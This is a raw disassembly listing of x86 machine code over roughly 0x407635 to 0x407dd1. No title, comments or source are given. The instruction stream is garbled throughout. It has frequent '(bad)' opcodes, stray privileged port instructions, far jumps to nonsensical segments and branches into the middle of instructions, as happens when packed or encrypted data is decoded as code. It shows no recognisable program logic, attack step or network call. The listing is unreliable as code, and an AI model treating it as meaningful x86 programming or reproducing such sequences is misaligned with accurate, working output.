  407635:	xchg   esp,eax
  407636:	mov    al,ds:0xd932df14
  40763b:	jecxz  0x407672
  40763d:	push   edx
  40763e:	aam    0x35
  407640:	je     0x4075c6
  407642:	ins    BYTE PTR es:[edi],dx
  407643:	sbb    DWORD PTR [ecx-0x58],esi
  407646:	sub    DWORD PTR [ebx-0x11],eax
  407649:	sub    bh,dl
  40764b:	fadd   DWORD PTR [ecx]
  40764d:	dec    ebp
  40764e:	(bad)  
  40764f:	cmc    
  407650:	loope  0x40769c
  407652:	adc    BYTE PTR [edx],ch
  407654:	sub    al,0x8e
  407656:	idiv   BYTE PTR [ecx+edi*8-0x38]
  40765a:	mov    ebp,0xe2889fce
  40765f:	(bad)  
  407660:	push   edi
  407661:	or     ecx,DWORD PTR [ebx-0x7b]
  407664:	push   0xffffffe2
  407666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407667:	cwde   
  407668:	xsavec [esi-0x5f]
  40766c:	psadbw mm0,mm6
  40766f:	shl    DWORD PTR [ecx],cl
  407671:	pop    edi
  407672:	mov    esp,0x90cf38b2
  407677:	cmp    BYTE PTR [eax+0x5f512dc8],0xf8
  40767e:	jge    0x4076a4
  407680:	xchg   edi,eax
  407681:	pop    edx
  407682:	aaa    
  407683:	add    ecx,ebp
  407685:	aaa    
  407686:	xchg   esp,eax
  407687:	sub    eax,DWORD PTR [edi]
  407689:	mov    bh,0xbc
  40768b:	fcom   st(0)
  40768d:	(bad)  [edx+0x40]
  407690:	pop    eax
  407691:	mov    esp,0x618646c7
  407696:	xchg   edx,eax
  407697:	stos   BYTE PTR es:[edi],al
  407698:	xor    bh,BYTE PTR [edx-0x1cd7d82a]
  40769e:	scas   eax,DWORD PTR es:[edi]
  40769f:	pop    edi
  4076a0:	fsub   DWORD PTR [edi]
  4076a2:	dec    edi
  4076a3:	and    DWORD PTR [ebp+edi*8-0x59d77a20],0x4216478e
  4076ae:	lahf   
  4076af:	push   0x55d81f64
  4076b4:	aam    0xb
  4076b6:	lods   al,BYTE PTR ds:[esi]
  4076b7:	mov    BYTE PTR [esi+0x36],bl
  4076ba:	sub    ch,0x14
  4076bd:	call   0x6eb9:0x8dbdf563
  4076c4:	xlat   BYTE PTR ds:[ebx]
  4076c5:	dec    ecx
  4076c6:	dec    ebp
  4076c7:	std    
  4076c8:	mov    DWORD PTR [ebx-0x6f7964b8],esi
  4076ce:	or     edi,eax
  4076d0:	push   esi
  4076d1:	xchg   ebx,eax
  4076d2:	mov    dh,0x99
  4076d4:	icebp  
  4076d5:	mov    esp,0x826f27c8
  4076da:	js     0x4076a8
  4076dc:	adc    dh,bl
  4076de:	push   ebx
  4076df:	mov    esp,0xdb44fb59
  4076e4:	clc    
  4076e5:	dec    ebp
  4076e6:	inc    eax
  4076e7:	imul   esp,esp,0xdc6eabf9
  4076ed:	enter  0xc39d,0xb
  4076f1:	adc    edi,edi
  4076f3:	test   DWORD PTR [esi+0x52],edi
  4076f6:	jbe    0x4076f1
  4076f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076f9:	mov    DWORD PTR [edi+edi*1-0x30550daa],esi
  407700:	dec    esi
  407701:	mov    bl,0xa6
  407703:	out    dx,eax
  407704:	scas   al,BYTE PTR es:[edi]
  407705:	inc    edi
  407706:	pop    ebx
  407707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407708:	inc    ecx
  407709:	in     eax,dx
  40770a:	pop    edx
  40770b:	cwde   
  40770c:	push   ecx
  40770d:	jb     0x4076e7
  40770f:	jnp    0x40776c
  407711:	jge    0x4076d1
  407713:	sbb    DWORD PTR [esp+ebp*8-0x6c],0x5b39928e
  40771b:	out    0x1d,al
  40771d:	jae    0x407787
  40771f:	les    edx,FWORD PTR [esi]
  407721:	mov    dl,0x23
  407723:	stos   DWORD PTR es:[edi],eax
  407724:	push   ebp
  407725:	jo     0x4076b3
  407727:	dec    edx
  407728:	enter  0xc662,0xb7
  40772c:	ret    
  40772d:	dec    esi
  40772e:	dec    ebp
  40772f:	mov    al,ds:0x9acc2ef4
  407734:	jl     0x407763
  407736:	aad    0x4b
  407738:	sub    al,BYTE PTR [ebx]
  40773a:	iret   
  40773b:	adc    ah,ah
  40773d:	es push edi
  40773f:	mov    esi,0xd582fb64
  407744:	ss or  al,0xa5
  407747:	retf   
  407748:	mov    bl,0xf4
  40774a:	ss (bad) 
  40774d:	repnz or al,0x7f
  407750:	add    edx,DWORD PTR [edi+0x2ef95e7c]
  407756:	das    
  407757:	add    al,0x73
  407759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40775a:	and    BYTE PTR [ebx+eax*8-0x2565656c],0x34
  407762:	iret   
  407763:	rcl    DWORD PTR [ebp+0x67],0x3b
  407767:	mov    bh,0x98
  407769:	mov    bh,0x11
  40776b:	pop    ss
  40776c:	icebp  
  40776d:	(bad)  
  40776e:	mov    cl,0xaf
  407770:	out    0x28,al
  407772:	xor    DWORD PTR [edx+0xa],0xfffffffe
  407776:	inc    esp
  407777:	aas    
  407778:	fsubr  DWORD PTR [ebx+eiz*1-0x15]
  40777c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40777d:	pop    ss
  40777e:	outs   dx,DWORD PTR ds:[esi]
  40777f:	add    BYTE PTR [esp+ebp*4-0x46],al
  407783:	pop    es
  407784:	fdivrp st(1),st
  407786:	dec    esp
  407787:	push   eax
  407788:	mov    ah,0xe5
  40778a:	inc    ebp
  40778b:	in     al,dx
  40778c:	pushf  
  40778d:	dec    edi
  40778e:	mov    esi,0xe5204eab
  407793:	mov    WORD PTR [eax+0x4badbe9],?
  407799:	cmc    
  40779a:	adc    DWORD PTR ds:0x99743872,ebx
  4077a0:	mov    dh,0x34
  4077a2:	xor    BYTE PTR [eax],bl
  4077a4:	out    0xd8,eax
  4077a6:	mov    ds:0x18c2a63b,eax
  4077ab:	mov    eax,0xa136a9a6
  4077b0:	sub    ebp,esp
  4077b2:	mov    DWORD PTR [ebx+0x643ff7a],esp
  4077b8:	stos   BYTE PTR es:[edi],al
  4077b9:	push   0xffffffbd
  4077bb:	lahf   
  4077bc:	mov    eax,ds:0x64a2ab14
  4077c1:	dec    ax
  4077c3:	cmp    al,0x55
  4077c5:	jae    0x40777c
  4077c7:	aad    0x8f
  4077c9:	adc    al,0x76
  4077cb:	rcl    BYTE PTR [ebx-0x66d8c394],cl
  4077d1:	jnp    0x40776e
  4077d3:	mov    esp,0x1a652edc
  4077d8:	(bad)  
  4077d9:	cmc    
  4077da:	outs   dx,DWORD PTR ds:[esi]
  4077db:	int3   
  4077dc:	inc    ebp
  4077dd:	adc    ecx,DWORD PTR [esi-0x72]
  4077e0:	dec    edi
  4077e1:	ins    DWORD PTR es:[edi],dx
  4077e2:	mov    ds:0x5aaad0be,eax
  4077e7:	les    esi,FWORD PTR [eax+0x2753d52]
  4077ed:	pop    ebx
  4077ee:	cmp    cl,ah
  4077f0:	pop    ebx
  4077f1:	(bad)  [ebx+0x62]
  4077f4:	shl    edi,1
  4077f6:	ds inc ebp
  4077f8:	imul   edi,DWORD PTR [eax+eax*4-0xa],0x7a
  4077fd:	push   ebx
  4077fe:	(bad)  
  4077ff:	fdivr  st(3),st
  407801:	xchg   ebx,eax
  407802:	sbb    dl,al
  407804:	(bad)  
  407805:	cwde   
  407806:	imul   ecx,esi,0xb4a6a831
  40780c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40780d:	out    dx,al
  40780e:	inc    ebx
  40780f:	fisttp QWORD PTR ds:0x767517ba
  407815:	aad    0x23
  407817:	pop    es
  407818:	push   ecx
  407819:	dec    ecx
  40781a:	push   edi
  40781b:	cmp    BYTE PTR [eax-0x25],0xf4
  40781f:	xchg   ebp,eax
  407820:	pusha  
  407821:	mov    ch,0x22
  407823:	push   eax
  407824:	pop    esp
  407825:	adc    al,dh
  407827:	fsubrp st(1),st
  407829:	(bad)  
  40782a:	adc    al,0x88
  40782c:	mov    edi,0x93db2175
  407831:	call   0xf3e5:0x5d3837fc
  407838:	shl    ebp,cl
  40783a:	in     al,0x19
  40783c:	xchg   edi,eax
  40783d:	ss icebp 
  40783f:	fist   WORD PTR [esi]
  407841:	aas    
  407842:	mov    DWORD PTR [edi+eiz*2+0x11b0bf77],ebp
  407849:	pop    ss
  40784a:	xchg   ebx,eax
  40784b:	mov    ebx,0xd264c267
  407850:	jmp    0x40785d
  407852:	icebp  
  407853:	sub    eax,0x65815c33
  407858:	pop    edi
  407859:	fist   WORD PTR [edi-0x66]
  40785c:	adc    ecx,DWORD PTR [eax+0x70]
  40785f:	(bad)  
  407861:	(bad)  
  407862:	nop
  407863:	add    al,0x86
  407865:	pop    esi
  407866:	add    al,BYTE PTR [esi+edx*2+0x3c]
  40786a:	and    DWORD PTR [ebx-0x6e],0x62fa4529
  407871:	jp     0x407883
  407873:	je     0x4078d0
  407875:	ret    
  407876:	or     al,BYTE PTR [edx+0x4800665b]
  40787c:	jbe    0x4078dc
  40787e:	cdq    
  40787f:	stc    
  407880:	or     DWORD PTR [ecx+0x68aa82a7],ebx
  407886:	sbb    esp,eax
  407888:	dec    ebx
  407889:	icebp  
  40788a:	ins    BYTE PTR es:[edi],dx
  40788b:	call   0xdf4d:0xd2d493d7
  407892:	call   0xc7602d57
  407897:	or     al,0x34
  407899:	sub    cl,al
  40789b:	lods   eax,DWORD PTR ds:[esi]
  40789c:	xor    DWORD PTR [ebp+eax*1+0x4f],ebx
  4078a0:	dec    edx
  4078a1:	inc    edx
  4078a2:	xor    dh,dh
  4078a4:	push   edi
  4078a5:	retf   0x5b
  4078a8:	shl    edx,cl
  4078aa:	int    0x2b
  4078ac:	mov    al,ds:0x59156796
  4078b1:	push   ebp
  4078b2:	cmp    edi,DWORD PTR [edx+0x30]
  4078b5:	push   eax
  4078b6:	aad    0xe8
  4078b8:	lods   eax,DWORD PTR ds:[esi]
  4078b9:	iret   
  4078ba:	add    bh,BYTE PTR [esi]
  4078bc:	and    dl,al
  4078be:	pop    DWORD PTR [eax-0x30]
  4078c1:	jne    0x4078a9
  4078c3:	adc    al,0xef
  4078c5:	into   
  4078c6:	cwde   
  4078c7:	repz or dl,BYTE PTR [edx]
  4078ca:	(bad)  
  4078cb:	mov    bh,BYTE PTR [eax]
  4078cd:	fist   WORD PTR [eax-0x36]
  4078d0:	adc    esi,DWORD PTR [eax-0x30fbb00]
  4078d6:	not    DWORD PTR [esi+0x7d]
  4078d9:	iret   
  4078da:	iret   
  4078db:	add    DWORD PTR [edi+ecx*2+0x79244bfd],edi
  4078e2:	in     eax,0x9f
  4078e4:	add    BYTE PTR [edi+0xf],ch
  4078e7:	jns    0x40787b
  4078e9:	stos   DWORD PTR es:[edi],eax
  4078ea:	add    al,0x24
  4078ec:	mov    ecx,0xe2e53146
  4078f1:	fstp   DWORD PTR [ebx+0x50]
  4078f4:	add    eax,0xf7508a6b
  4078f9:	out    dx,al
  4078fa:	sbb    eax,DWORD PTR [ebx+0x49]
  4078fd:	retf   
  4078fe:	rol    DWORD PTR [eax],1
  407900:	fistp  QWORD PTR [edx]
  407902:	push   ss
  407903:	(bad)  
  407904:	and    BYTE PTR [edi+0x3f],ch
  407907:	cs in  al,dx
  407909:	jle    0x407951
  40790b:	outs   dx,BYTE PTR ds:[esi]
  40790c:	push   edi
  40790d:	aas    
  40790e:	outs   dx,DWORD PTR ds:[esi]
  40790f:	pop    esi
  407910:	push   eax
  407911:	jno    0x407940
  407913:	out    0x56,eax
  407915:	pop    ebp
  407916:	frstor [esi+0x163f6c19]
  40791c:	test   edi,esp
  40791e:	rcr    cl,cl
  407920:	rcr    dl,0x55
  407923:	mov    eax,ds:0x7b284b30
  407928:	xchg   esi,eax
  407929:	xor    bl,BYTE PTR [eax+eiz*2-0x18]
  40792d:	xchg   esp,eax
  40792e:	and    eax,0x210252d0
  407933:	cli    
  407934:	sub    BYTE PTR ds:0x601fa509,bl
  40793a:	xchg   DWORD PTR [eax+eax*4-0x9],esi
  40793e:	in     eax,0x4a
  407940:	fimul  DWORD PTR [ebx-0xc]
  407943:	sbb    WORD PTR [ecx+0x7d00334f],bx
  40794a:	fisttp DWORD PTR [ecx+0x4ac48a39]
  407950:	test   bl,ch
  407952:	mul    ecx
  407954:	cwde   
  407955:	xchg   esp,eax
  407956:	(bad)  
  407957:	stos   DWORD PTR es:[edi],eax
  407958:	or     eax,0xaa6d2769
  40795d:	fstp   TBYTE PTR [eax+0x51]
  407960:	jecxz  0x40790f
  407962:	push   cs
  407963:	pop    ecx
  407964:	xchg   edx,eax
  407965:	mov    ecx,DWORD PTR ds:0x8f730ddf
  40796b:	pop    esp
  40796c:	pop    esi
  40796d:	out    dx,eax
  40796e:	stos   BYTE PTR es:[edi],al
  40796f:	ret    0xe9b3
  407972:	xchg   ch,bl
  407974:	jnp    0x4079ef
  407976:	les    ebp,FWORD PTR [ebx]
  407978:	daa    
  407979:	cmp    dh,BYTE PTR [esi-0x47]
  40797c:	jns    0x4079ab
  40797e:	sbb    ah,BYTE PTR [esi-0x2d96ee32]
  407984:	or     ebp,DWORD PTR ds:0x92e9de4a
  40798a:	std    
  40798b:	and    eax,0xa96fbf57
  407990:	push   ds
  407991:	stos   DWORD PTR es:[edi],eax
  407992:	jns    0x4079c2
  407994:	fs mov ch,0xd1
  407997:	xchg   esi,eax
  407998:	(bad)  
  407999:	dec    edi
  40799a:	pop    ebx
  40799b:	xchg   ecx,eax
  40799c:	jg     0x40793f
  40799e:	push   ecx
  40799f:	mov    BYTE PTR [ebx+0x2c],dl
  4079a2:	mov    al,ds:0x6f63249d
  4079a7:	add    BYTE PTR [eax-0x1130fab3],bh
  4079ad:	mov    dl,0x70
  4079af:	xchg   DWORD PTR [ecx+0x49],ebp
  4079b2:	add    dl,BYTE PTR [edx]
  4079b4:	push   edx
  4079b5:	or     ch,BYTE PTR [ecx]
  4079b7:	in     al,0x3a
  4079b9:	popf   
  4079ba:	ret    0x3ed2
  4079bd:	xor    al,0x66
  4079bf:	mov    ch,0xd6
  4079c1:	mov    eax,esi
  4079c3:	mov    bl,BYTE PTR [ebx-0x22]
  4079c6:	jmp    0xd836f2b3
  4079cb:	jnp    0x407a4c
  4079cd:	outs   dx,DWORD PTR ds:[esi]
  4079ce:	retf   0xbdc2
  4079d1:	aaa    
  4079d2:	pop    eax
  4079d3:	pop    edi
  4079d4:	jo     0x4079fd
  4079d6:	popf   
  4079d7:	cmp    bl,dh
  4079d9:	sbb    DWORD PTR [ebx+0x46b44e70],ecx
  4079df:	add    al,0xb2
  4079e1:	nop
  4079e2:	mov    al,0xb7
  4079e4:	lea    ebp,[edx+0x1c]
  4079e7:	fbstp  TBYTE PTR [eax+0x11]
  4079ea:	loope  0x407a2b
  4079ec:	mov    dl,BYTE PTR [edi+ebx*8+0x47]
  4079f0:	jnp    0x407a2a
  4079f2:	fnstenv [edx]
  4079f4:	pop    ss
  4079f5:	in     eax,dx
  4079f6:	js     0x407a74
  4079f8:	test   al,0x83
  4079fa:	nop
  4079fb:	ss push edx
  4079fd:	push   edx
  4079fe:	xor    al,0x6d
  407a00:	push   es
  407a01:	pusha  
  407a02:	cmc    
  407a03:	out    dx,eax
  407a04:	(bad)  
  407a05:	int    0xaa
  407a07:	hlt    
  407a08:	(bad)  
  407a09:	xchg   esi,eax
  407a0a:	pop    ebp
  407a0b:	mov    al,al
  407a0d:	aad    0x32
  407a0f:	inc    ebx
  407a10:	dec    ecx
  407a11:	mov    WORD PTR [esi+0x3e],es
  407a14:	jbe    0x4079a3
  407a16:	shr    BYTE PTR [eax-0x10],cl
  407a19:	xchg   esp,eax
  407a1a:	and    al,BYTE PTR [eax+ebp*2+0x2c9e1412]
  407a21:	and    esp,DWORD PTR [edi-0x7cd97f4]
  407a27:	add    al,0x25
  407a29:	int    0x27
  407a2b:	jmp    DWORD PTR [bp+si+0x3d7a]
  407a30:	sub    BYTE PTR [eax+0x19],bh
  407a33:	jmp    0x3693c2c6
  407a38:	lods   al,BYTE PTR ds:[esi]
  407a39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a3a:	dec    esp
  407a3b:	add    bh,bl
  407a3d:	aaa    
  407a3e:	cmc    
  407a3f:	push   esp
  407a40:	sbb    al,0x78
  407a42:	jmp    0x54c4fe3b
  407a47:	sub    eax,0x88eccbdb
  407a4c:	sbb    eax,0x25afd450
  407a51:	scas   al,BYTE PTR es:[edi]
  407a52:	adc    esp,DWORD PTR [ebx+0x465f11ca]
  407a58:	adc    al,0xbf
  407a5a:	loope  0x407a64
  407a5c:	aad    0xf4
  407a5e:	pop    eax
  407a5f:	cwde   
  407a60:	mov    cl,0x68
  407a62:	nop
  407a63:	xchg   edi,eax
  407a64:	and    BYTE PTR ds:0x2d83ad7a,bl
  407a6a:	iret   
  407a6b:	mov    ebx,0xcc0ed3c4
  407a70:	mov    al,BYTE PTR [ecx]
  407a72:	hlt    
  407a73:	xlat   BYTE PTR ds:[ebx]
  407a74:	bound  eax,QWORD PTR [ecx]
  407a76:	test   DWORD PTR [ecx+0x54ac2805],esi
  407a7c:	test   eax,0x298cf529
  407a81:	(bad)  
  407a82:	test   eax,0xb5a490fa
  407a87:	mov    cl,0x4
  407a89:	or     DWORD PTR [esi],0x28
  407a8c:	ja     0x407a81
  407a8e:	jnp    0x407a81
  407a90:	sub    BYTE PTR [ecx],dh
  407a92:	xor    eax,0xcc1b6f4d
  407a97:	ins    DWORD PTR es:[edi],dx
  407a98:	shl    DWORD PTR [ebx-0x6bd89a0],cl
  407a9e:	dec    ebp
  407a9f:	and    al,0x14
  407aa1:	pop    ecx
  407aa2:	aam    0x5f
  407aa4:	mov    BYTE PTR [eax+0x1d89d803],bh
  407aaa:	addr16 inc ebx
  407aac:	mov    al,ds:0x5382d747
  407ab1:	xor    dh,BYTE PTR gs:[ebx]
  407ab4:	cmc    
  407ab5:	fs icebp 
  407ab7:	(bad)  
  407ab8:	leave  
  407ab9:	cld    
  407aba:	mov    WORD PTR [esi+0x2c56f993],fs
  407ac0:	xchg   ebp,eax
  407ac1:	push   esp
  407ac2:	xor    DWORD PTR [eax+0x24a38268],0xd5c5c6ce
  407acc:	icebp  
  407acd:	out    dx,al
  407ace:	pop    edi
  407acf:	and    DWORD PTR fs:[edi+0x28],esp
  407ad3:	shr    DWORD PTR [edx+0x30],cl
  407ad6:	inc    ebp
  407ad7:	xchg   ecx,eax
  407ad8:	push   es
  407ad9:	sbb    dh,al
  407adb:	mov    edx,0x3011aafc
  407ae0:	out    0x4c,eax
  407ae2:	mov    ch,0xa5
  407ae4:	xor    ebx,esi
  407ae6:	cdq    
  407ae7:	dec    esi
  407ae8:	mov    bh,0x2f
  407aea:	xchg   ebp,eax
  407aeb:	jl     0x407b43
  407aed:	jb     0x407aad
  407aef:	xchg   ecx,eax
  407af0:	cld    
  407af1:	imul   edi,DWORD PTR [ecx-0x7f],0x20
  407af5:	rcr    BYTE PTR [ebp-0x73],0xd5
  407af9:	ror    BYTE PTR ds:0xe68ee413,1
  407aff:	or     eax,0xa6759f84
  407b04:	pop    ss
  407b05:	xchg   ebx,eax
  407b06:	adc    ch,cl
  407b08:	mov    al,BYTE PTR [eax+0x1f]
  407b0b:	scas   al,BYTE PTR es:[edi]
  407b0c:	sub    edx,edx
  407b0e:	jmp    0x3eb2:0x77bdf469
  407b15:	repz jecxz 0x407b8a
  407b18:	push   ss
  407b19:	or     esi,DWORD PTR [esi+ebp*1-0x26d46cf5]
  407b20:	shl    DWORD PTR [edx+ebp*2+0x52f78af2],0xce
  407b28:	test   BYTE PTR [esi+edi*1+0x51],bl
  407b2c:	xchg   edi,eax
  407b2d:	cmp    edx,DWORD PTR [ecx]
  407b2f:	sbb    edx,DWORD PTR [ebx+0x13]
  407b32:	dec    edx
  407b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b34:	into   
  407b35:	mov    ds:0xdf949017,eax
  407b3a:	shl    ah,1
  407b3c:	fucomi st,st(4)
  407b3e:	add    al,BYTE PTR [edx-0x74]
  407b41:	into   
  407b42:	out    0x5,eax
  407b44:	cmp    dl,BYTE PTR [eax]
  407b46:	scas   al,BYTE PTR es:[edi]
  407b47:	lds    esp,FWORD PTR [esi+0x753d726a]
  407b4d:	fwait
  407b4e:	and    eax,0x6bcc1140
  407b53:	xor    al,0xcb
  407b55:	mov    al,ds:0xc6f2ce54
  407b5a:	test   al,0xc4
  407b5c:	jp     0x407b55
  407b5e:	mov    bl,0x21
  407b60:	ret    
  407b61:	mov    ch,0x58
  407b63:	add    al,ch
  407b65:	dec    ecx
  407b66:	nop
  407b67:	stos   DWORD PTR es:[edi],eax
  407b68:	mov    ds,eax
  407b6a:	push   edi
  407b6b:	dec    bp
  407b6d:	lahf   
  407b6e:	mov    eax,0x9997dbfc
  407b73:	repnz or BYTE PTR [eax+0x25],cl
  407b77:	les    esi,FWORD PTR ds:0xdde78bcc
  407b7d:	imul   ebx,DWORD PTR [ebp+0x7b2e133],0x87d05d0c
  407b87:	jns    0x407bfd
  407b89:	xor    esi,DWORD PTR [edx]
  407b8b:	jge    0x407b44
  407b8d:	mov    edi,0xb1a75b2
  407b92:	jmp    0x135f:0x1636ed96
  407b99:	fbstp  TBYTE PTR [eax]
  407b9b:	xchg   ebx,eax
  407b9c:	test   eax,ebp
  407b9e:	xchg   ebp,eax
  407b9f:	and    al,0x2b
  407ba1:	sub    DWORD PTR [ebx+0x15],0x7d635306
  407ba8:	jb     0x407b35
  407baa:	mov    al,0x41
  407bac:	gs or  eax,0x7b0b89c3
  407bb2:	inc    esi
  407bb3:	repnz nop
  407bb5:	inc    ebp
  407bb6:	leave  
  407bb7:	jmp    0xc0edbb55
  407bbc:	dec    ebp
  407bbd:	sbb    ebx,DWORD PTR [ecx-0x15680f40]
  407bc3:	lahf   
  407bc4:	sub    BYTE PTR [edi],cl
  407bc6:	mov    ebp,0x95c2b017
  407bcb:	push   edi
  407bcc:	mov    dh,0x64
  407bce:	cwde   
  407bcf:	in     eax,dx
  407bd0:	jmp    0xa93c:0x60c08d88
  407bd7:	fcom   QWORD PTR [eax]
  407bd9:	xor    eax,DWORD PTR [esi+0x4a0ba759]
  407bdf:	imul   ebp,edx,0xbc73d9
  407be5:	jbe    0x407bf1
  407be7:	xchg   edi,eax
  407be8:	mov    ds:0x7c2b1fd8,al
  407bed:	sti    
  407bee:	das    
  407bef:	out    0x7e,eax
  407bf1:	xchg   ebx,eax
  407bf2:	adc    al,0x4c
  407bf4:	(bad)  
  407bf5:	lds    edi,FWORD PTR [ebp+0xe]
  407bf8:	fidivr WORD PTR [eax+0x3b]
  407bfb:	adc    BYTE PTR [eax-0x40],cl
  407bfe:	sub    eax,0xde999c01
  407c03:	das    
  407c04:	mov    esp,0xaeb46f79
  407c09:	(bad)  
  407c0a:	addr16 pop edx
  407c0c:	inc    edi
  407c0d:	cmp    ebx,eax
  407c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c10:	lock (bad) 
  407c13:	sub    al,0x87
  407c15:	test   DWORD PTR [esi+0x69],esp
  407c18:	ss sub eax,0x17f21941
  407c1e:	sub    DWORD PTR [esi],esi
  407c20:	mov    ds:0x2a80e481,al
  407c25:	dec    esp
  407c26:	xor    ebp,DWORD PTR [edi-0x5324917e]
  407c2c:	test   eax,0x3e290f01
  407c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c32:	mov    ah,0x9a
  407c34:	aam    0x52
  407c36:	sub    al,0xbe
  407c38:	add    eax,0x4fe8ca12
  407c3d:	add    edi,edi
  407c3f:	daa    
  407c40:	pop    ss
  407c41:	retf   
  407c42:	aad    0xaa
  407c44:	enter  0xf91b,0x9a
  407c48:	pop    ebp
  407c49:	leave  
  407c4a:	xor    al,0x4b
  407c4c:	mul    ebp
  407c4e:	daa    
  407c4f:	jge    0x407c8d
  407c51:	fwait
  407c52:	mov    bh,0xb1
  407c54:	imul   esp,DWORD PTR ds:0x41ce623b,0xffffffb7
  407c5b:	sar    BYTE PTR [edx],1
  407c5d:	push   ebp
  407c5e:	push   esi
  407c5f:	pop    ebx
  407c60:	jae    0x407c72
  407c62:	nop
  407c63:	mov    ds:0x2fdb3df2,al
  407c68:	adc    DWORD PTR [esi+edx*4-0x66],eax
  407c6c:	inc    ecx
  407c6d:	mov    edx,0x8a1a1f0b
  407c72:	cld    
  407c73:	pop    edx
  407c74:	daa    
  407c75:	mov    ch,0xf3
  407c77:	jg     0x407c38
  407c79:	xor    BYTE PTR [ecx],dh
  407c7b:	mov    bh,0x80
  407c7d:	xlat   BYTE PTR ds:[ebx]
  407c7e:	cwde   
  407c7f:	add    esp,eax
  407c81:	and    DWORD PTR [edi+0x4a2ee44c],0x18
  407c88:	sbb    eax,0x2d60049b
  407c8d:	mov    bh,0x78
  407c8f:	jne    0x407cc1
  407c91:	test   eax,0x69253677
  407c96:	jne    0x407ceb
  407c98:	add    eax,0xe5cdcecc
  407c9d:	shl    BYTE PTR [eax],1
  407c9f:	es hlt 
  407ca1:	sub    BYTE PTR [esi],dh
  407ca3:	outs   dx,DWORD PTR ds:[esi]
  407ca4:	sbb    cl,bh
  407ca6:	les    eax,FWORD PTR [eax-0x409da0b8]
  407cac:	and    BYTE PTR [ecx],bl
  407cae:	sub    cl,BYTE PTR [eax+esi*4+0x26c7f8f0]
  407cb5:	stos   DWORD PTR es:[edi],eax
  407cb6:	imul   ebx,DWORD PTR [ebx+0x6a],0x257b5e36
  407cbd:	in     al,0x99
  407cbf:	fld    QWORD PTR [edi-0x14]
  407cc2:	mov    bh,0xa4
  407cc4:	xchg   ebx,eax
  407cc5:	pushf  
  407cc6:	jne    0x407ccb
  407cc8:	mov    edx,ecx
  407cca:	outs   dx,BYTE PTR ds:[esi]
  407ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ccc:	and    eax,0x52ec5ca2
  407cd1:	es enter 0xe665,0x8a
  407cd6:	xchg   ebp,eax
  407cd7:	pop    ecx
  407cd8:	lock lods eax,DWORD PTR ds:[esi]
  407cda:	int    0xf
  407cdc:	iret   
  407cdd:	mov    esp,0xfe0aa984
  407ce2:	lds    esi,FWORD PTR [edx+ecx*2]
  407ce5:	sub    bh,BYTE PTR [edi+0x39]
  407ce8:	and    eax,0xeb8095f1
  407ced:	fld    QWORD PTR [eax+0x5c]
  407cf0:	add    DWORD PTR [edi-0x5d],ebp
  407cf3:	sub    cl,al
  407cf5:	xchg   ecx,eax
  407cf6:	sub    DWORD PTR [eax+0x70dabfc],0x11
  407cfd:	mov    ds:0x94ddda21,eax
  407d02:	inc    edi
  407d03:	aad    0x97
  407d05:	(bad)  
  407d06:	fwait
  407d07:	pop    ss
  407d08:	jb     0x407caa
  407d0a:	xchg   edi,eax
  407d0b:	les    eax,FWORD PTR [esi]
  407d0d:	or     ch,BYTE PTR [esi-0x3a59621]
  407d13:	sub    al,0x85
  407d15:	sbb    esp,ebx
  407d17:	out    0xd3,eax
  407d19:	inc    edx
  407d1a:	cmp    BYTE PTR [esi+ebx*1-0x14],al
  407d1e:	dec    esp
  407d1f:	ret    
  407d20:	iret   
  407d21:	in     eax,0x20
  407d23:	fist   DWORD PTR [ecx+0x1e]
  407d26:	and    al,0x20
  407d28:	ja     0x407d8f
  407d2a:	pop    edx
  407d2b:	repnz cmp DWORD PTR [esp+ebx*1-0x6020fedd],ebx
  407d33:	out    0x32,al
  407d35:	(bad)  
  407d36:	and    eax,0x34458b07
  407d3b:	cmp    esp,DWORD PTR [edi+ebx*1-0x47b2b754]
  407d42:	jle    0x407ccf
  407d44:	sub    DWORD PTR [edi-0x4e],esi
  407d47:	clc    
  407d48:	fisttp WORD PTR [edx+0x5d]
  407d4b:	gs sti 
  407d4d:	mov    esp,0x941fdacc
  407d52:	shr    esi,1
  407d54:	cwde   
  407d55:	shl    BYTE PTR [edi+edi*2],0xc4
  407d59:	cmp    BYTE PTR [edi+eax*4],0xdc
  407d5d:	pop    ebx
  407d5e:	adc    edx,0xc8782ca8
  407d64:	inc    edi
  407d65:	clc    
  407d66:	push   ebx
  407d67:	sub    eax,DWORD PTR [ebx-0x3a5f6e93]
  407d6d:	push   0x1e
  407d6f:	and    DWORD PTR [ebx],ecx
  407d71:	mov    esp,0xecaaddd3
  407d76:	data16 and al,0x4c
  407d79:	bound  ebp,QWORD PTR [ecx-0x715fbd9e]
  407d7f:	jg     0x407dd0
  407d81:	add    esi,ebx
  407d83:	outs   dx,DWORD PTR ds:[esi]
  407d84:	adc    al,0x26
  407d86:	or     eax,0x2f493c8e
  407d8b:	jmp    0x407e04
  407d8d:	ret    0x9459
  407d90:	xchg   esi,eax
  407d91:	fcmovnb st,st(5)
  407d93:	mov    WORD PTR [edi+0x1f01a13a],ss
  407d99:	jae    0x407d93
  407d9b:	xchg   edi,eax
  407d9c:	popf   
  407d9d:	cmp    DWORD PTR [ecx-0x34],ecx
  407da0:	stc    
  407da1:	hlt    
  407da2:	sub    bh,cl
  407da4:	out    0xfb,eax
  407da6:	xchg   edx,eax
  407da7:	test   al,0x24
  407da9:	neg    ecx
  407dab:	xor    eax,DWORD PTR [esi]
  407dad:	jb     0x407e1a
  407daf:	push   0xffffff87
  407db1:	in     al,0x63
  407db3:	cmp    eax,DWORD PTR [edi]
  407db5:	pop    esp
  407db6:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  407db8:	and    edi,DWORD PTR [ebx]
  407dba:	(bad)  
  407dbb:	cwde   
  407dbc:	(bad)  ds:0x8e73e47f
  407dc2:	ja     0x407dda
  407dc4:	mov    dh,dh
  407dc6:	imul   eax,DWORD PTR [ebp+0x18eb7eb0],0x601c359f
  407dd0:	retf   
  407dd1:	ror    esi,1
